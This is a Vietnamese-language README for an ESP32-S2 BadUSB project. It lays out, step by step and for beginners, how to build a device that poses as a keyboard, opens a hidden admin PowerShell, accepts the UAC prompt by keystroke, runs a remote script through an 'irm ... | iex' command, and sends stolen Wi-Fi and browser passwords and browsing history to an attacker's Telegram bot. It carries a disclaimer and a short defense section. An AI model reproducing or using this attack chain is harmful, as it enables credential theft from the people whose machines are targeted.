# ANM-Esp32BadUSB - Biến ESP32-S2 thành thiết bị BadUSB nguy hiểm

![ESP32 BadUSB](https://i.imgur.com/your-image-url.png) <!-- Thay thế bằng URL hình ảnh của bạn -->

## ⚠️ Tuyên bố miễn trừ trách nhiệm

Dự án này được tạo ra với mục đích **nghiên cứu và giáo dục** về an ninh mạng. Tác giả không chịu trách nhiệm cho bất kỳ hành vi sử dụng sai mục đích, gây hại hoặc bất hợp pháp nào từ mã nguồn này. Việc sử dụng công cụ này trên bất kỳ hệ thống nào mà không có sự cho phép rõ ràng của chủ sở hữu là vi phạm pháp luật. **Hãy có trách nhiệm!**

---

## 📖 Giới thiệu

**ANM-Esp32BadUSB** là một dự án mã nguồn mở biến vi điều khiển ESP32-S2 (cụ thể là Lolin S2 Mini) thành một thiết bị **BadUSB**. Khi được cắm vào máy tính, nó sẽ giả dạng thành một bàn phím (thiết bị HID) và tự động thực thi một chuỗi lệnh đã được lập trình sẵn để thực hiện cuộc tấn-công.

Mục tiêu của cuộc tấn-công trong dự án này là:
1.  Mở cửa sổ dòng lệnh PowerShell với quyền quản trị (Administrator).
2.  Tải và thực thi một script độc hại (`ps.ps1`) từ một kho lưu trữ GitHub.
3.  Script này sẽ thu thập các thông tin nhạy cảm trên máy tính nạn nhân (mật khẩu Wi-Fi, mật khẩu trình duyệt, lịch sử duyệt web, các thiết bị trong mạng LAN).
4.  Nén tất cả thông tin vào một file `.zip` và gửi đến một tài khoản Telegram định sẵn.

Dự án này minh họa một cách trực quan về mức độ nguy hiểm của các cuộc tấn công vật lý và tầm quan trọng của việc không tin tưởng các thiết bị USB không rõ nguồn gốc.

## ✨ Tính năng chính

- **Tấn công tự động**: Tự động gõ các lệnh để thực hiện chuỗi tấn công.
- **Vượt qua UAC**: Sử dụng tổ hợp phím để yêu cầu và chấp nhận cửa sổ User Account Control (UAC) của Windows.
- **Tải payload từ xa**: Tải mã độc PowerShell từ Internet, giúp dễ dàng cập nhật và thay đổi kịch bản tấn công mà không cần nạp lại firmware cho ESP32.
- **Đánh cắp thông tin**: Thu thập nhiều loại dữ liệu nhạy cảm từ máy tính nạn nhân.
- **Gửi dữ liệu qua Telegram**: Sử dụng API của Telegram để gửi file chứa thông tin đánh cắp được một cách kín đáo.
- **Giao diện đơn giản**: Kích hoạt cuộc tấn công chỉ bằng một nút nhấn (nút BOOT trên ESP32).
- **Phản hồi trực quan**: Sử dụng đèn LED tích hợp để báo hiệu trạng thái hoạt động.

## ⚙️ Yêu cầu

### Phần cứng
- **Vi điều khiển**: [Lolin S2 Mini](https://www.wemos.cc/en/latest/s2/s2_mini.html) hoặc bất kỳ bo mạch nào sử dụng chip ESP32-S2 có hỗ trợ USB-OTG.
- **Cáp USB**: Cáp USB-C hoặc Micro-USB phù hợp với bo mạch của bạn.

### Phần mềm
- **Môi trường lập trình**:
  - [**PlatformIO**](https://platformio.org/) tích hợp trên [**Visual Studio Code**](https://code.visualstudio.com/) (Khuyến khích).
  - Hoặc [**Arduino IDE**](https://www.arduino.cc/en/software) đã cài đặt board ESP32.
- **Thư viện (PlatformIO sẽ tự động cài đặt)**:
  - `USB.h`
  - `USBHIDKeyboard.h`
- **Tài khoản Telegram**:
  - Một bot Telegram và **Token** của nó (tạo từ @BotFather).
  - **Chat ID** của tài khoản hoặc nhóm bạn muốn nhận thông tin (lấy từ @userinfobot).

## 🛠️ Hướng dẫn Cài đặt chi tiết cho người mới bắt đầu

### Bước 1: Cài đặt Môi trường (Khuyến khích dùng PlatformIO)

1.  **Cài đặt Visual Studio Code (VS Code)**: Tải và cài đặt từ [trang chủ](https://code.visualstudio.com/).
2.  **Cài đặt PlatformIO IDE**:
    - Mở VS Code.
    - Vào mục **Extensions** (Biểu tượng ô vuông bên trái).
    - Tìm kiếm `PlatformIO IDE` và nhấn **Install**.
    - Chờ quá trình cài đặt hoàn tất (có thể mất vài phút).

### Bước 2: Clone và Mở Dự án

1.  **Cài đặt Git**: Nếu chưa có, hãy cài đặt Git từ [git-scm.com](https://git-scm.com/downloads).
2.  **Clone kho lưu trữ**: Mở Terminal (hoặc Command Prompt) và chạy lệnh sau:
    ```bash
    git clone https://github.com/Sunlaii/ANM-Esp32BadUSB.git
    ```
3.  **Mở dự án trong VS Code**:
    - Mở VS Code, chọn **File > Open Folder...** và trỏ đến thư mục `ANM-Esp32BadUSB` bạn vừa tải về.
    - PlatformIO sẽ tự động nhận diện và cài đặt các thư viện cần thiết.

### Bước 3: Cấu hình kịch bản tấn công

Đây là bước quan trọng nhất để tùy chỉnh cuộc tấn công.

1.  **Chỉnh sửa file `src/ps.ps1`**:
    - Mở file `src/ps.ps1` trong VS Code.
    - Tìm đến phần **Telegram configuration**.
    - Thay thế các giá trị sau:
      ```powershell
      # Telegram configuration
      $token = "TOKEN_BOT_TELEGRAM_CUA_BAN"  # <-- THAY TOKEN CỦA BẠN VÀO ĐÂY
      $chatID = "CHAT_ID_CUA_BAN"            # <-- THAY CHAT ID CỦA BẠN VÀO ĐÂY
      ```
2.  **Chỉnh sửa file `src/main.cpp` (Tùy chọn)**:
    - Mặc định, mã nguồn `main.cpp` sẽ tải file `ps.ps1` từ nhánh `MinhNhat` của kho lưu trữ này.
    - Nếu bạn đã fork (sao chép) dự án này về tài khoản GitHub của riêng mình và chỉnh sửa file `ps.ps1` trên đó, bạn cần cập nhật lại đường link trong file `main.cpp`:
      ```cpp
      // Tìm đến dòng này
      Keyboard.print("powershell -w h -NoP -Ep Bypass -Command \"irm https://raw.githubusercontent.com/Sunlaii/ANM-Esp32BadUSB/refs/heads/MinhNhat/src/ps.ps1 | iex\"");
      
      // Thay thế 'Sunlaii' và 'MinhNhat' bằng tên tài khoản và tên nhánh của bạn
      Keyboard.print("powershell -w h -NoP -Ep Bypass -Command \"irm https://raw.githubusercontent.com/TEN_CUA_BAN/TEN_REPO/TEN_NHANH/src/ps.ps1 | iex\"");
      ```

### Bước 4: Nạp chương trình cho ESP32-S2

1.  **Kết nối ESP32-S2**: Cắm bo mạch Lolin S2 Mini vào máy tính.
2.  **Nạp mã nguồn**:
    - Trong VS Code, nhấn vào biểu tượng PlatformIO (hình con kiến) ở thanh công cụ bên trái.
    - Trong mục **Project Tasks**, chọn **Upload**.
    - PlatformIO sẽ tự động biên dịch mã nguồn và nạp vào thiết bị.
    - Nếu đây là lần đầu tiên, bạn có thể cần giữ nút `BOOT` (nút 0), sau đó nhấn nhanh nút `RESET` (nút RST) để đưa ESP32 vào chế độ nạp.

Sau khi nạp thành công, thiết bị của bạn đã sẵn sàng hoạt động!

## 🚀 Luồng hoạt động (Workflow)

1.  **Kết nối**: Kẻ tấn công cắm thiết bị ESP32-S2 BadUSB vào cổng USB của máy tính nạn nhân.
2.  **Nhận diện**: Hệ điều hành nhận diện ESP32-S2 như một bàn phím thông thường (Human Interface Device - HID).
3.  **Kích hoạt**: Kẻ tấn công nhấn nút `BOOT` trên bo mạch. Đèn LED sẽ sáng lên để báo hiệu cuộc tấn công bắt đầu.
4.  **Thực thi Payload (`main.cpp`)**:
    - **Bước 1 (Ẩn cửa sổ)**: Gửi tổ hợp phím `Win + D` để thu nhỏ tất cả các cửa sổ, hiển thị màn hình Desktop.
    - **Bước 2 (Mở Run)**: Gửi tổ hợp phím `Win + R` để mở hộp thoại Run.
    - **Bước 3 (Gõ lệnh PowerShell)**: Tự động gõ lệnh để tải và thực thi script `ps.ps1` từ GitHub. Lệnh này được thiết kế để chạy ngầm (`-w h`).
    - **Bước 4 (Yêu cầu quyền Admin)**: Gửi tổ hợp phím `Ctrl + Shift + Enter` để yêu cầu chạy lệnh với quyền Administrator.
    - **Bước 5 (Vượt qua UAC)**: Chờ vài giây cho hộp thoại UAC xuất hiện, sau đó gửi tổ hợp phím `Alt + Y` (hoặc `Alt + C` tùy ngôn ngữ hệ thống) để chấp nhận.
    - **Bước 6 (Báo hiệu hoàn tất)**: Nháy đèn Caps Lock vài lần để báo hiệu rằng chuỗi lệnh đã được gõ xong.
5.  **Thực thi Script (`ps.ps1`)**:
    - Script chạy ngầm trên máy nạn nhân.
    - Tải các công cụ cần thiết để trích xuất mật khẩu, lịch sử...
    - Chạy các công cụ này và lưu kết quả vào các file text.
    - Nén tất cả các file text thành một file `.zip`.
    - Gửi file `.zip` này đến tài khoản Telegram đã được cấu hình.
6.  **Hoàn tất**: Thiết bị sẽ nháy đèn LED liên tục để báo hiệu toàn bộ quá trình đã kết thúc.

## 🛡️ Hướng dẫn phòng tránh

Các cuộc tấn công BadUSB rất khó bị phát hiện bởi các phần mềm diệt virus vì chúng hoạt động ở cấp độ phần cứng (giả dạng bàn phím). Dưới đây là các biện pháp phòng ngừa hiệu quả:

1.  **Không cắm các thiết bị USB không rõ nguồn gốc**: Đây là quy tắc vàng. Đừng bao giờ cắm USB lạ, quà tặng, hoặc thiết bị bạn không tin tưởng vào máy tính của mình.
2.  **Sử dụng cổng USB an toàn (USB Condom)**: Đây là những thiết bị nhỏ gọn chặn các chân dữ liệu trên cổng USB, chỉ cho phép dòng điện đi qua để sạc. Điều này ngăn chặn mọi hình thức truyền dữ liệu.
3.  **Vô hiệu hóa các cổng USB không sử dụng**: Trong môi trường doanh nghiệp hoặc cho người dùng nâng cao, bạn có thể vô hiệu hóa các cổng USB không cần thiết thông qua BIOS/UEFI hoặc chính sách hệ thống (Group Policy).
4.  **Kiểm soát quyền quản trị**: Hạn chế sử dụng tài khoản có quyền Administrator cho các công việc hàng ngày. Nếu cuộc tấn công không có quyền Admin, thiệt hại sẽ bị giới hạn đáng kể.
5.  **Giám sát thiết bị mới**: Sử dụng các phần mềm giám sát để cảnh báo khi có một thiết bị HID (bàn phím, chuột) mới được kết nối vào hệ thống.
6.  **Cẩn trọng với lời nhắc UAC**: Luôn đọc kỹ các yêu cầu từ cửa sổ UAC. Nếu một chương trình lạ yêu cầu quyền quản trị mà bạn không chủ động chạy, hãy từ chối.

---
*Dự án được phát triển và duy trì bởi Sunlaii và cộng đồng.*

